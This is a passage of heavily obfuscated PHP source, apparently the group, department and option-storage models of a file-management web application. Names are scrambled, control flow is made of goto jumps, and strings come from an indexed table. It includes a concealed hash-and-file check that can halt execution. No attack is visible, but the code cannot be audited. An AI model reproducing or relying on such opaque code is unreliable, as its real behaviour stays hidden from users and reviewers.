$this->groupChildrenAll($D¹»ÇîÇÚ¨); $bç©àƒæï = $this->_searchFromMeta($Aé˜»Ş•¨[452], $aó£ÄÊÅ¶, 10, $c÷‹»ËâºŠ); $DŸ‚…©¤œ = $this->_searchFromMeta($Aé˜»Ş•¨[453], $aó£ÄÊÅ¶, 10, $c÷‹»ËâºŠ); goto a‡ÕØİá ; Eïòã¤òïê: $eäª…±‡Õ–[$Aé˜»Ş•¨[364]][$Aé˜»Ş•¨[366]] = ceil($eäª…±‡Õ–[$Aé˜»Ş•¨[364]][$Aé˜»Ş•¨[365]] / $eäª…±‡Õ–[$Aé˜»Ş•¨[364]][$Aé˜»Ş•¨[361]]); goto fã¤¼¾å¸§; a‡ÕØİá : $bÆÌÛàº› = array_merge($bç©àƒæï, $DŸ‚…©¤œ, $eäª…±‡Õ–[$Aé˜»Ş•¨[367]]); $eäª…±‡Õ–[$Aé˜»Ş•¨[367]] = array_unique_by_key($bÆÌÛàº›, $Aé˜»Ş•¨[1693]); $eäª…±‡Õ–[$Aé˜»Ş•¨[364]][$Aé˜»Ş•¨[365]] = count($eäª…±‡Õ–[$Aé˜»Ş•¨[367]]); goto Eïòã¤òïê; fã¤¼¾å¸§: } $this->_listDataApply($eäª…±‡Õ–[$Aé˜»Ş•¨[367]]); goto AÏ™Ä†š; f§–‰á˜“Ç: $Aé˜»Ş•¨ =& $_SERVER[«¾°Ã¤]; $aó£ÄÊÅ¶ = $b¤ª©ã¯İØ[$Aé˜»Ş•¨[1776]]; $D¹»ÇîÇÚ¨ = isset($b¤ª©ã¯İØ[$Aé˜»Ş•¨[1777]]) ? $b¤ª©ã¯İØ[$Aé˜»Ş•¨[1777]] : !1; goto dº¤©¿›­Ÿ; CÂ…³‹õó: } protected function groupChildrenAll($fõ‰óá«Åğ) { $Fé„ï±¨’ =& $_SERVER[«¾°Ã¤]; if (!$fõ‰óá«Åğ) { return !1; } if (is_string($fõ‰óá«Åğ)) { $fõ‰óá«Åğ = array($fõ‰óá«Åğ); } $cƒÙÍ³í˜â = $fõ‰óá«Åğ; foreach ($fõ‰óá«Åğ as $fªÜäÂä†¼) { $d×Ëøƒ­ Ô = $this->getInfoSimple($fªÜäÂä†¼); $F†ŞÙÑ„ È = array($Fé„ï±¨’[496] => array($Fé„ï±¨’[380], $d×Ëøƒ­ Ô[$Fé„ï±¨’[496]] . $fªÜäÂä†¼ . $Fé„ï±¨’[522])); $C‘‡µä = $this->field($Fé„ï±¨’[1693])->where($F†ŞÙÑ„ È)->select(); $cƒÙÍ³í˜â = array_merge($cƒÙÍ³í˜â, array_to_keyvalue($C‘‡µä, $Fé„ï±¨’[33], $Fé„ï±¨’[1693])); } return array_unique($cƒÙÍ³í˜â); } private function _searchFromMeta($cöëš£¡, $DáºÍ™‚ö‘, $B¹¡‘©÷ìÃ, $e¿§•„®›ö) { goto dÌ‡Ê‹‹Â…; cÜ¿¨¥¾Í: if (!$E÷Ï´Çí·) { return array(); } return $E÷Ï´Çí·; goto B¸ÂÃæ¤¾; dÌ‡Ê‹‹Â…: $F“‡Îñíğ =& $_SERVER[«¾°Ã¤]; $DáºÍ™‚ö‘ = strtolower($DáºÍ™‚ö‘); $EÌñÍˆŠáš = array($F“‡Îñíğ[93] => $cöëš£¡, $F“‡Îñíğ[372] => array($F“‡Îñíğ[380], "\x25{$DáºÍ™‚ö‘}\x25")); goto A±Ìã°¹äø; A±Ìã°¹äø: $EÌñÍˆŠáš = $this->parseWhereLike($EÌñÍˆŠáš); if ($e¿§•„®›ö) { $EÌñÍˆŠáš[$F“‡Îñíğ[1693]] = array($F“‡Îñíğ[7], $e¿§•„®›ö); } $C¿»¤ƒ˜Ïå = Model($F“‡Îñíğ[1781])->where($EÌñÍˆŠáš)->limit($B¹¡‘©÷ìÃ)->select(); goto CíŞŒ´å; CíŞŒ´å: if (!$C¿»¤ƒ˜Ïå) { return array(); } $C¿»¤ƒ˜Ïå = array_to_keyvalue($C¿»¤ƒ˜Ïå, $F“‡Îñíğ[33], $F“‡Îñíğ[1693]); $E÷Ï´Çí· = $this->where(array($F“‡Îñíğ[1771] => array($F“‡Îñíğ[7], $C¿»¤ƒ˜Ïå)))->select(); goto cÜ¿¨¥¾Í; B¸ÂÃæ¤¾: } protected function _listDataApplyItem($dÙŠÒ½Ç’ñ) { $DÔãé‡“öã = array($dÙŠÒ½Ç’ñ); $this->_listDataApply($DÔãé‡“öã); return $DÔãé‡“öã[0]; } protected function _listDataApply(&$BÇ˜ø´¥À«) { goto AÍŸƒ¿„‘Â; AÍŸƒ¿„‘Â: $dåĞ¢ëï® =& $_SERVER[«¾°Ã¤]; if (!$BÇ˜ø´¥À«) { return; } $E­Şƒ‡¡ÙÚ = array_to_keyvalue($BÇ˜ø´¥À«, $dåĞ¢ëï®[33], $dåĞ¢ëï®[1693]); goto E¸çÔÕ‹”¼; E¸çÔÕ‹”¼: $this->_listAppendChildren($BÇ˜ø´¥À«); $this->_listAppendChildrenMember($BÇ˜ø´¥À«); $this->_listAppendMeta($BÇ˜ø´¥À«, $E­Şƒ‡¡ÙÚ); goto d½åÀà®Á¥; d½åÀà®Á¥: $this->_listAppendParent($BÇ˜ø´¥À«); $this->_listAppendSourceRoot($BÇ˜ø´¥À«, $E­Şƒ‡¡ÙÚ); goto BÆ¯¢ùƒÂ«; BÆ¯¢ùƒÂ«: } private function _listAppendChildren(&$f‘Š™÷Ø¶) { goto Fº­ª½õñª; A…ùÑæÖ¿—: $a¯†˜¡¬ = array($CøŸ¶óù¬[487], $CøŸ¶óù¬[1782] => $CøŸ¶óù¬[489]); $cà›¾õ§Ëª = $this->field($a¯†˜¡¬)->where($a­¼ó‘ª¬”)->group($CøŸ¶óù¬[487])->select(); $aöñ®Å­…Œ = array_to_keyvalue($cà›¾õ§Ëª, $CøŸ¶óù¬[487], $CøŸ¶óù¬[489]); goto dë¶‰ôÜ·; Fº­ª½õñª: $CøŸ¶óù¬ =& $_SERVER[«¾°Ã¤]; $bŒìêä“ê¬ = array_to_keyvalue($f‘Š™÷Ø¶, $CøŸ¶óù¬[33], $CøŸ¶óù¬[1693]); $a­¼ó‘ª¬” = array($CøŸ¶óù¬[487] => array($CøŸ¶óù¬[7], $bŒìêä“ê¬)); goto A…ùÑæÖ¿—; dë¶‰ôÜ·: foreach ($f‘Š™÷Ø¶ as &$e±××ÈÃ¶‘) { $E‘ãÔğÏƒ× = $e±××ÈÃ¶‘[$CøŸ¶óù¬[1693]]; $e±××ÈÃ¶‘[$CøŸ¶óù¬[1783]] = isset($aöñ®Å­…Œ[$E‘ãÔğÏƒ×]) ? intval($aöñ®Å­…Œ[$E‘ãÔğÏƒ×]) : !1; } unset($e±××ÈÃ¶‘); goto f‘ÔäÊ‰Ñ; f‘ÔäÊ‰Ñ: } private function _listAppendChildrenMember(&$f®‘ƒ«Â÷·) { goto Aí–‡šŸ‹ª; BÆØ•ÑÑ°È: foreach ($f®‘ƒ«Â÷· as &$B¾°ŒŠ­¥ù) { $cÓ¥ğ²ôà  = $B¾°ŒŠ­¥ù[$cÅÚÅôœîØ[1693]]; $B¾°ŒŠ­¥ù[$cÅÚÅôœîØ[1784]] = isset($dàÁ…ğ‡ˆ[$cÓ¥ğ²ôà ]) ? intval($dàÁ…ğ‡ˆ[$cÓ¥ğ²ôà ]) : !1; } unset($B¾°ŒŠ­¥ù); goto dÂ‹µ˜ºæ•; Aí–‡šŸ‹ª: $cÅÚÅôœîØ =& $_SERVER[«¾°Ã¤]; $B¢µî£¹¤È = array_to_keyvalue($f®‘ƒ«Â÷·, $cÅÚÅôœîØ[33], $cÅÚÅôœîØ[1693]); $e×Šñ”èà = array($cÅÚÅôœîØ[1693] => array($cÅÚÅôœîØ[7], $B¢µî£¹¤È)); goto Fø°äÄ……Š; Fø°äÄ……Š: $b˜‘øíÂ­Ú = array($cÅÚÅôœîØ[1693], $cÅÚÅôœîØ[1782] => $cÅÚÅôœîØ[489]); $bµ¦¦™ù· = Model($cÅÚÅôœîØ[1774])->field($b˜‘øíÂ­Ú)->where($e×Šñ”èà)->group($cÅÚÅôœîØ[1693])->select(); $dàÁ…ğ‡ˆ = array_to_keyvalue($bµ¦¦™ù·, $cÅÚÅôœîØ[1693], $cÅÚÅôœîØ[489]); goto BÆØ•ÑÑ°È; dÂ‹µ˜ºæ•: } private function _listAppendMeta(&$f¥šö› ×², $CÓœ¾ô‹°É) { goto e¡¤ŞË—ôï; fË«òå¸ã: foreach ($f¥šö› ×² as &$F¸Š‹ìÏµÈ) { $F¸Š‹ìÏµÈ[$A Û½ñç©¬[454]] = array(); if (isset($bó½×åœÁ[$F¸Š‹ìÏµÈ[$A Û½ñç©¬[1693]]])) { $F¸Š‹ìÏµÈ[$A Û½ñç©¬[454]] = $bó½×åœÁ[$F¸Š‹ìÏµÈ[$A Û½ñç©¬[1693]]]; } } unset($F¸Š‹ìÏµÈ); goto e”Ô­Û‰èª; AîßÄ‹Æå: $bó½×åœÁ = array_to_keyvalue_group($bó½×åœÁ, $A Û½ñç©¬[1693]); foreach ($bó½×åœÁ as &$D‡˜Á«Ìõ÷) { $D‡˜Á«Ìõ÷ = array_to_keyvalue($D‡˜Á«Ìõ÷, $A Û½ñç©¬[93], $A Û½ñç©¬[372]); } unset($D‡˜Á«Ìõ÷); goto fË«òå¸ã; e¡¤ŞË—ôï: $A Û½ñç©¬ =& $_SERVER[«¾°Ã¤]; $c¨©®öĞæç = array($A Û½ñç©¬[1693] => array($A Û½ñç©¬[7], $CÓœ¾ô‹°É)); $bó½×åœÁ = Model($A Û½ñç©¬[1773])->where($c¨©®öĞæç)->select(); goto AîßÄ‹Æå; e”Ô­Û‰èª: } protected function parentLevelArray($B¤åˆ“Éİó) { $b›ù¾ŒŸ½¸ =& $_SERVER[«¾°Ã¤]; $B¤åˆ“Éİó = explode($b›ù¾ŒŸ½¸[47], trim($B¤åˆ“Éİó, $b›ù¾ŒŸ½¸[47])); $B¤åˆ“Éİó = array_remove_value($B¤åˆ“Éİó, $b›ù¾ŒŸ½¸[191]); return $B¤åˆ“Éİó; } private function _listAppendParent(&$Eåä°ê‘¢›) { goto f¯¡åî£Şˆ; F¢Ï÷Ï…÷Ã: unset($F›“‘¥òÕª); foreach ($a›÷ ¤ŠßÉ as $e‰Øå¿‘Ì => $f³Çˆ˜ğŒ›) { if ($f³Çˆ˜ğŒ›) { continue; } $Bƒ÷’ÜÔğñ = $this->getInfoSimple($e‰Øå¿‘Ì); $a›÷ ¤ŠßÉ[$e‰Øå¿‘Ì] = $Bƒ÷’ÜÔğñ[$C®ã¢ª¢õØ[28]]; } $F±´½¤ˆÖ = $GLOBALS[$C®ã¢ª¢õØ[6]][$C®ã¢ª¢õØ[88]][$C®ã¢ª¢õØ[1785]]; goto FµÒÇ¯îÇ; FµÒÇ¯îÇ: if ($GLOBALS[$C®ã¢ª¢õØ[494]] == $C®ã¢ª¢õØ[87]) { $F±´½¤ˆÖ = !1; } foreach ($Eåä°ê‘¢› as &$F›“‘¥òÕª) { $CŒÔæ¢…ßœ = $this->parentLevelArray($F›“‘¥òÕª[$C®ã¢ª¢õØ[496]]); $A‹ÒÜ†Æµ = $C®ã¢ª¢õØ[33]; foreach ($CŒÔæ¢…ßœ as $e‰Øå¿‘Ì => $c†íÔŠö•Ò) { if ($F±´½¤ˆÖ && $e‰Øå¿‘Ì == 0) { continue; } $A‹ÒÜ†Æµ .= $a›÷ ¤ŠßÉ[$c†íÔŠö•Ò] . $C®ã¢ª¢õØ[8]; } if ($CŒÔæ¢…ßœ) { $A‹ÒÜ†Æµ .= $F›“‘¥òÕª[$C®ã¢ª¢õØ[28]]; } $F›“‘¥òÕª[$C®ã¢ª¢õØ[500]] = str_replace($C®ã¢ª¢õØ[505], $C®ã¢ª¢õØ[8], $A‹ÒÜ†Æµ); } unset($F›“‘¥òÕª); goto B•¾äå©äÌ; f¯¡åî£Şˆ: $C®ã¢ª¢õØ =& $_SERVER[«¾°Ã¤]; $a›÷ ¤ŠßÉ = array(); foreach ($Eåä°ê‘¢› as &$F›“‘¥òÕª) { $a›÷ ¤ŠßÉ[$F›“‘¥òÕª[$C®ã¢ª¢õØ[1693]]] = $F›“‘¥òÕª[$C®ã¢ª¢õØ[28]]; $CŒÔæ¢…ßœ = $this->parentLevelArray($F›“‘¥òÕª[$C®ã¢ª¢õØ[496]]); foreach ($CŒÔæ¢…ßœ as $c†íÔŠö•Ò) { if (!isset($a›÷ ¤ŠßÉ[$c†íÔŠö•Ò])) { $a›÷ ¤ŠßÉ[$c†íÔŠö•Ò] = 0; } } } goto F¢Ï÷Ï…÷Ã; B•¾äå©äÌ: } private function _listAppendSourceRoot(&$EŠ¤ÈÍÏ, $cŸ•¼£÷ñ) { goto f— ÕôßÜø; f— ÕôßÜø: $f‰²¸ÏÏï• =& $_SERVER[«¾°Ã¤]; $aè×³ßí‡© = array($f‰²¸ÏÏï•[413] => SourceModel::TYPE_GROUP, $f‰²¸ÏÏï•[487] => 0, $f‰²¸ÏÏï•[493] => array($f‰²¸ÏÏï•[7], $cŸ•¼£÷ñ)); $FíŸœ³Ê·ª = $f‰²¸ÏÏï•[1786]; goto Aöõ‚˜Şƒ˜; aÏ˜Ñ‰Êæ: foreach ($EŠ¤ÈÍÏ as &$Añåã—™³) { $Añåã—™³[$f‰²¸ÏÏï•[85]] = $f˜…ù«„Î[$Añåã—™³[$f‰²¸ÏÏï•[1693]]] ? $f˜…ù«„Î[$Añåã—™³[$f‰²¸ÏÏï•[1693]]] : array(); } unset($Añåã—™³); goto BòÉŞ§·™õ; Aöõ‚˜Şƒ˜: $f˜…ù«„Î = Model($f‰²¸ÏÏï•[799])->order($f‰²¸ÏÏï•[1787])->field($FíŸœ³Ê·ª)->where($aè×³ßí‡©)->select(); $f˜…ù«„Î = array_to_keyvalue($f˜…ù«„Î, $f‰²¸ÏÏï•[493]); $f˜…ù«„Î = array_remove_key($f˜…ù«„Î, $f‰²¸ÏÏï•[493]); goto aÏ˜Ñ‰Êæ; BòÉŞ§·™õ: } protected function groupMerge($cÖä–÷µ®è) { $cÖä–÷µ®è = array_values(array_unique($cÖä–÷µ®è)); $C¸ë‚–¿é = array(); for ($Bãƒ³Èº¢ê = 0; $Bãƒ³Èº¢ê < count($cÖä–÷µ®è); $Bãƒ³Èº¢ê++) { $Bñ¶¨î¤î¿ = !1; for ($f å®‰˜” = 0; $f å®‰˜” < count($cÖä–÷µ®è); $f å®‰˜”++) { if ($Bãƒ³Èº¢ê == $f å®‰˜”) { continue; } if ($this->isParentOf($cÖä–÷µ®è[$f å®‰˜”], $cÖä–÷µ®è[$Bãƒ³Èº¢ê])) { $Bñ¶¨î¤î¿ = !0; break; } } if (!$Bñ¶¨î¤î¿) { $C¸ë‚–¿é[] = $cÖä–÷µ®è[$Bãƒ³Èº¢ê]; } } return $C¸ë‚–¿é; } protected function isParentOf($F«¿„‡­‡‚, $Cˆ¬Ï³¾—Ã) { goto e¿œŒÎ‰à¯; e¿œŒÎ‰à¯: $f®ˆï½Ê£ =& $_SERVER[«¾°Ã¤]; if (!$F«¿„‡­‡‚ || !$Cˆ¬Ï³¾—Ã || $F«¿„‡­‡‚ == $Cˆ¬Ï³¾—Ã) { return !1; } $e™‚ƒİÔ  = $this->getInfoSimple($F«¿„‡­‡‚); goto CÌ àğ„œ¬; CÌ àğ„œ¬: $f¡ëøÄã° = $this->getInfoSimple($Cˆ¬Ï³¾—Ã); $B‡æï­Õùõ = $e™‚ƒİÔ [$f®ˆï½Ê£[496]] . $F«¿„‡­‡‚ . $f®ˆï½Ê£[47]; if (substr($f¡ëøÄã°[$f®ˆï½Ê£[496]], 0, strlen($B‡æï­Õùõ)) == $B‡æï­Õùõ) { return !0; } goto e‹Êœ–Öæ; e‹Êœ–Öæ: return !1; goto bŸğ’İÍæ; bŸğ’İÍæ: } public function groupShowRoot($b»¦ÉÈ×±•, $b›‰®Ğ£Õ = false) { goto AªØöÃ™¨™; AªØöÃ™¨™: $b“»××÷ÒŠ =& $_SERVER[«¾°Ã¤]; $e×›˜×»äâ = $this->getInfo($b»¦ÉÈ×±•); if (!$e×›˜×»äâ) { return array(); } goto cßùÍˆç¡Ê; C †ê‰ËêÕ: return $bç–ğÚ‰¦À; goto aà³Û‹ê¨ù; cßùÍˆç¡Ê: $b‹™¶Ä³½É = $this->parentLevelArray($e×›˜×»äâ[$b“»××÷ÒŠ[496]]); $bç–ğÚ‰¦À = array($b»¦ÉÈ×±•); if (count($b‹™¶Ä³½É) == 0) { return $bç–ğÚ‰¦À; } goto B¡À÷ñÆ½Ú; B¡À÷ñÆ½Ú: if ($b›‰®Ğ£Õ && count($b‹™¶Ä³½É) == 1) { return $bç–ğÚ‰¦À; } if (!$e×›˜×»äâ[$b“»××÷ÒŠ[454]] || !isset($e×›˜×»äâ[$b“»××÷ÒŠ[454]][$b“»××÷ÒŠ[1769]]) || $e×›˜×»äâ[$b“»××÷ÒŠ[454]][$b“»××÷ÒŠ[1769]] == $b“»××÷ÒŠ[1743]) { return $this->groupShowRoot($b‹™¶Ä³½É[count($b‹™¶Ä³½É) - 1], $b›‰®Ğ£Õ); } if ($e×›˜×»äâ[$b“»××÷ÒŠ[454]][$b“»××÷ÒŠ[1769]] == $b“»××÷ÒŠ[357]) { $d°÷ìÖ¹¬ = explode($b“»××÷ÒŠ[47], $e×›˜×»äâ[$b“»××÷ÒŠ[454]][$b“»××÷ÒŠ[1770]]); if ($d°÷ìÖ¹¬) { $bç–ğÚ‰¦À = array_merge($bç–ğÚ‰¦À, $d°÷ìÖ¹¬); } } goto C †ê‰ËêÕ; aà³Û‹ê¨ù: } protected function resetParentLevel() { $D¼„‰®ãïŞ =& $_SERVER[«¾°Ã¤]; $A÷…Î‹íİî = $D¼„‰®ãïŞ[1693]; $d´¦ãŠ•¹² = $this->select(); $d´¦ãŠ•¹² = array_to_keyvalue($d´¦ãŠ•¹², $A÷…Î‹íİî); foreach ($d´¦ãŠ•¹² as $dÙõà§ÙÃ) { goto b¥åùº‰¢; b•Ù» Ú: $CĞÍ”×‹³ø[] = 0; $CĞÍ”×‹³ø = $D¼„‰®ãïŞ[47] . implode($D¼„‰®ãïŞ[47], array_reverse($CĞÍ”×‹³ø)) . $D¼„‰®ãïŞ[47]; $this->setNamePinyin($dÙõà§ÙÃ[$A÷…Î‹íİî], $dÙõà§ÙÃ[$D¼„‰®ãïŞ[28]]); goto A¾“óäê”Ô; A¾“óäê”Ô: $this->where(array($A÷…Î‹íİî => $dÙõà§ÙÃ[$A÷…Î‹íİî]))->save(array($D¼„‰®ãïŞ[562] => $CĞÍ”×‹³ø)); goto a¤ƒ„ğ‹ê; b¥åùº‰¢: $A—Ú×¨“÷Á = $dÙõà§ÙÃ; $CĞÍ”×‹³ø = array(); while ($A—Ú×¨“÷Á[$D¼„‰®ãïŞ[487]] != 0) { $CĞÍ”×‹³ø[] = $A—Ú×¨“÷Á[$D¼„‰®ãïŞ[487]]; $A—Ú×¨“÷Á = $d´¦ãŠ•¹²[$A—Ú×¨“÷Á[$D¼„‰®ãïŞ[487]]]; } goto b•Ù» Ú; a¤ƒ„ğ‹ê: } return $d´¦ãŠ•¹²; } public function groupNameAuto($E²î‹Ú¸ä‡, $a¤‘›Àœš‰) { $f×õàÔìÈ =& $_SERVER[«¾°Ã¤]; $EÀÀØˆ®ÙÒ = $this->where(array($f×õàÔìÈ[403] => $E²î‹Ú¸ä‡))->getField($f×õàÔìÈ[28], !0); if (!$EÀÀØˆ®ÙÒ || !in_array($a¤‘›Àœš‰, $EÀÀØˆ®ÙÒ)) { return $a¤‘›Àœš‰; } for ($b‰Àíóİ¶ = 1; $b‰Àíóİ¶ <= count($EÀÀØˆ®ÙÒ) + 1; $b‰Àíóİ¶++) { $AÎ´²³ÅÏ = $a¤‘›Àœš‰ . "\x28{$b‰Àíóİ¶}\51"; if (!in_array($AÎ´²³ÅÏ, $EÀÀØˆ®ÙÒ)) { return $AÎ´²³ÅÏ; } } } public function groupSwitch($A¤øãÊ®­£, $EÕÁ‰½Ã ‡) { goto a‘Ã²Ÿ±õ; DŸá•ßøˆì: $c˜Ö¾ôƒ´ = array($B”µ¯ïÀ¸˜[413] => 2, $B”µ¯ïÀ¸˜[487] => 0, $B”µ¯ïÀ¸˜[412] => 1, $B”µ¯ïÀ¸˜[493] => array($B”µ¯ïÀ¸˜[7], array($A¤øãÊ®­£, $EÕÁ‰½Ã ‡))); $bâ–èì»ñ• = Model($B”µ¯ïÀ¸˜[799])->where($c˜Ö¾ôƒ´)->field($B”µ¯ïÀ¸˜[1789])->select(); $bâ–èì»ñ• = array_to_keyvalue($bâ–èì»ñ•, $B”µ¯ïÀ¸˜[493], $B”µ¯ïÀ¸˜[404]); goto fÔ ™‘ºÇ; fÔ ™‘ºÇ: $cŒ‡‡¿‡øß = !empty($bâ–èì»ñ•[$A¤øãÊ®­£]) ? $bâ–èì»ñ•[$A¤øãÊ®­£] : !1; if ($cŒ‡‡¿‡øß) { goto d‹®èæ†¸º; C³õºÂÕœù: foreach ($bâ–èì»ñ• as $FáÖÕ–Ø’ª) { $fƒí—Ìë = $FáÖÕ–Ø’ª[$B”µ¯ïÀ¸˜[412]] == $B”µ¯ïÀ¸˜[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($B”µ¯ïÀ¸˜[799])->move($FáÖÕ–Ø’ª[$B”µ¯ïÀ¸˜[404]], $cŞ¡… Ó›­, $fƒí—Ìë); } Model($B”µ¯ïÀ¸˜[799])->moveClearAuth = !0; $c˜Ö¾ôƒ´ = array($B”µ¯ïÀ¸˜[413] => 2, $B”µ¯ïÀ¸˜[493] => $A¤øãÊ®­£); goto CØÚêÆ¡©; CØÚêÆ¡©: $eèœÃ£ó—± = array($B”µ¯ïÀ¸˜[493] => $EÕÁ‰½Ã ‡); Model($B”µ¯ïÀ¸˜[1791])->where($c˜Ö¾ôƒ´)->save($eèœÃ£ó—±); Model($B”µ¯ïÀ¸˜[1792])->where($c˜Ö¾ôƒ´)->save($eèœÃ£ó—±); goto E£µƒ„óĞ; d‹®èæ†¸º: if (!$bâ–èì»ñ•[$EÕÁ‰½Ã ‡]) { $bâ–èì»ñ•[$EÕÁ‰½Ã ‡] = Model($B”µ¯ïÀ¸˜[799])->groupRootAdd($EÕÁ‰½Ã ‡); } $cŞ¡… Ó›­ = $bâ–èì»ñ•[$EÕÁ‰½Ã ‡]; $c˜Ö¾ôƒ´ = array($B”µ¯ïÀ¸˜[487] => $cŒ‡‡¿‡øß); goto Dè’âª…Í¸; Dè’âª…Í¸: $bâ–èì»ñ• = Model($B”µ¯ïÀ¸˜[799])->where($c˜Ö¾ôƒ´)->field($B”µ¯ïÀ¸˜[1790])->select(); if (!$bâ–èì»ñ•) { $bâ–èì»ñ• = array(); } Model($B”µ¯ïÀ¸˜[799])->moveClearAuth = !1; goto C³õºÂÕœù; E£µƒ„óĞ: } $this->_changeChildLevel($a×Æ¦½É’[$A¤øãÊ®­£], $a×Æ¦½É’[$EÕÁ‰½Ã ‡], !0); goto CÑ¤Ş²„ª; aù„çõ‘‰: $EÓÌÈµáÁ§ = Model($B”µ¯ïÀ¸˜[1774])->where($c˜Ö¾ôƒ´)->select(); if (!$EÓÌÈµáÁ§) { $EÓÌÈµáÁ§ = array(); } foreach ($EÓÌÈµáÁ§ as $bäóŒ›ÕÏ) { $dÂ¬ŠñŒ¥ = $bäóŒ›ÕÏ[$B”µ¯ïÀ¸˜[1529]]; $c˜Ö¾ôƒ´ = array($B”µ¯ïÀ¸˜[1529] => $dÂ¬ŠñŒ¥, $B”µ¯ïÀ¸˜[1693] => $EÕÁ‰½Ã ‡); $F««¥»ĞÉĞ = Model($B”µ¯ïÀ¸˜[1774])->where($c˜Ö¾ôƒ´)->find(); if (!$F««¥»ĞÉĞ) { $EâÑ×£§Œ½ = array($EÕÁ‰½Ã ‡ => $bäóŒ›ÕÏ[$B”µ¯ïÀ¸˜[1788]]); Model($B”µ¯ïÀ¸˜[515])->userGroupAdd($dÂ¬ŠñŒ¥, $EâÑ×£§Œ½); } Model($B”µ¯ïÀ¸˜[515])->userGroupRemove($dÂ¬ŠñŒ¥, $A¤øãÊ®­£); } goto DŸá•ßøˆì; AÛ‰××©â: $a×Æ¦½É’ = array_to_keyvalue($a×Æ¦½É’, $B”µ¯ïÀ¸˜[1693]); if (!isset($a×Æ¦½É’[$A¤øãÊ®­£]) || !isset($a×Æ¦½É’[$EÕÁ‰½Ã ‡]) || $a×Æ¦½É’[$A¤øãÊ®­£][$B”µ¯ïÀ¸˜[487]] == 0) { return !1; } $c˜Ö¾ôƒ´ = array($B”µ¯ïÀ¸˜[1693] => $A¤øãÊ®­£); goto aù„çõ‘‰; a‘Ã²Ÿ±õ: $B”µ¯ïÀ¸˜ =& $_SERVER[«¾°Ã¤]; $c˜Ö¾ôƒ´ = array($B”µ¯ïÀ¸˜[1693] => array($B”µ¯ïÀ¸˜[7], array($A¤øãÊ®­£, $EÕÁ‰½Ã ‡))); $a×Æ¦½É’ = $this->where($c˜Ö¾ôƒ´)->select(); goto AÛ‰××©â; CÑ¤Ş²„ª: $this->where(array($B”µ¯ïÀ¸˜[487] => $A¤øãÊ®­£))->save(array($B”µ¯ïÀ¸˜[487] => $EÕÁ‰½Ã ‡)); return !0; goto Câ¼‡‹«›Œ; Câ¼‡‹«›Œ: } } goto b¢÷í„öš; f‡ìôáåÂé: $E¼ãàÓñæ = $_SERVER[«¾°Ã¤][395]; if ($_SERVER[$_SERVER[«¾°Ã¤][396]] != $E¼ãàÓñæ($AÎ„ìÜß)) { goto EĞñ©¿òƒ‹; ağ™ˆ†Òğ½: $A„÷„Å($AÎ„ìÜß); goto C¶ø²Ü¢êÁ; EĞñ©¿òƒ‹: $DÉÍŒÇÂŒ = $_SERVER[«¾°Ã¤][397]; $Aîì·»æÕ­ = $_SERVER[$_SERVER[«¾°Ã¤][398]] . $_SERVER[«¾°Ã¤][399]; $Dî‹‚ãÃéÇ = $DÉÍŒÇÂŒ($Aîì·»æÕ­); goto fø‰Ç†Ø‡; fø‰Ç†Ø‡: $FöÛÊ›¿ = explode($_SERVER[«¾°Ã¤][229], $Dî‹‚ãÃéÇ); if (count($FöÛÊ›¿) < $_SERVER[«¾°Ã¤][400]) { $Böéª’ÓñÎ = $_SERVER[«¾°Ã¤][401]; $Böéª’ÓñÎ(); } $A„÷„Å = $_SERVER[«¾°Ã¤][402]; goto ağ™ˆ†Òğ½; C¶ø²Ü¢êÁ: } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($BóˆŒÙÅæ = false, $C¹Ô±•‘Öï = '', $c’ÜÅª¡äÁ = false) { goto dâ½†Íé‚Ü; Då‹£Ú®Åè: $F¾›ñÛ‘‚ = is_array($F¾›ñÛ‘‚) ? $F¾›ñÛ‘‚ : array(); if (is_array($C™ÍÖ¼ª‰‰)) { $C™ÍÖ¼ª‰‰ = array_merge($F¾›ñÛ‘‚, $C™ÍÖ¼ª‰‰); return $BóˆŒÙÅæ ? isset($C™ÍÖ¼ª‰‰[$BóˆŒÙÅæ]) ? $C™ÍÖ¼ª‰‰[$BóˆŒÙÅæ] : null : $C™ÍÖ¼ª‰‰; } $e¶¾Ô¦† = $this->filterWhere(array($DÀøà©İÅ[29] => $C¹Ô±•‘Öï)); goto B¶‚ñ¯ ¢Ó; dâ½†Íé‚Ü: $DÀøà©İÅ =& $_SERVER[«¾°Ã¤]; $C™ÍÖ¼ª‰‰ = $this->cacheGet($C¹Ô±•‘Öï); $F¾›ñÛ‘‚ = $this->optionDefault($C¹Ô±•‘Öï); goto Då‹£Ú®Åè; B¶‚ñ¯ ¢Ó: $C™ÍÖ¼ª‰‰ = $this->where($e¶¾Ô¦†)->select(); $C™ÍÖ¼ª‰‰ = array_to_keyvalue($C™ÍÖ¼ª‰‰, $DÀøà©İÅ[93], $DÀøà©İÅ[372]); foreach ($C™ÍÖ¼ª‰‰ as $e³¶×Ü‚­ => $AºÔëêÂÛ¬) { if ($c’ÜÅª¡äÁ || in_array($e³¶×Ü‚­, $this->jsonField)) { $C™ÍÖ¼ª‰‰[$e³¶×Ü‚­] = json_decode($AºÔëêÂÛ¬, !0); } } goto DŠäµŒÄ‰ ; DŠäµŒÄ‰ : $this->cacheSet($C¹Ô±•‘Öï, $C™ÍÖ¼ª‰‰); $C™ÍÖ¼ª‰‰ = array_merge($F¾›ñÛ‘‚, $C™ÍÖ¼ª‰‰); return $BóˆŒÙÅæ ? $C™ÍÖ¼ª‰‰[$BóˆŒÙÅæ] : $C™ÍÖ¼ª‰‰; goto däî¶Î¤Í™; däî¶Î¤Í™: } public function set($cêÒ¤ƒ¾Û˜, $dÒ„ÉŞÇÜŠ = false, $d‹Ìø• = '') { goto D¾ÜğĞï•; eãßñ‡Ù¹Ì: return $this->addAll($AÉƒÂêóÁù, array(), !0); goto eÊÜÉ×ùÑÂ; D¾ÜğĞï•: $EöÑî“íÊï =& $_SERVER[«¾°Ã¤]; $this->cacheRemove($d‹Ìø•); $AÉƒÂêóÁù = array(); goto B¹‘ë˜òéÔ; B¹‘ë˜òéÔ: $eŒ£İ§ÜÔ× = is_array($cêÒ¤ƒ¾Û˜) ? $cêÒ¤ƒ¾Û˜ : array($cêÒ¤ƒ¾Û˜ => $dÒ„ÉŞÇÜŠ); foreach ($eŒ£İ§ÜÔ× as $fÈ¶„¼ñç => $aŞ±æĞ²£§) { if (is_array($aŞ±æĞ²£§)) { $aŞ±æĞ²£§ = json_encode_force($aŞ±æĞ²£§); } $this->checkLength($aŞ±æĞ²£§, !1, $this->tableName . $EöÑî“íÊï[4] . $cêÒ¤ƒ¾Û˜); $aŞ±æĞ²£§ = 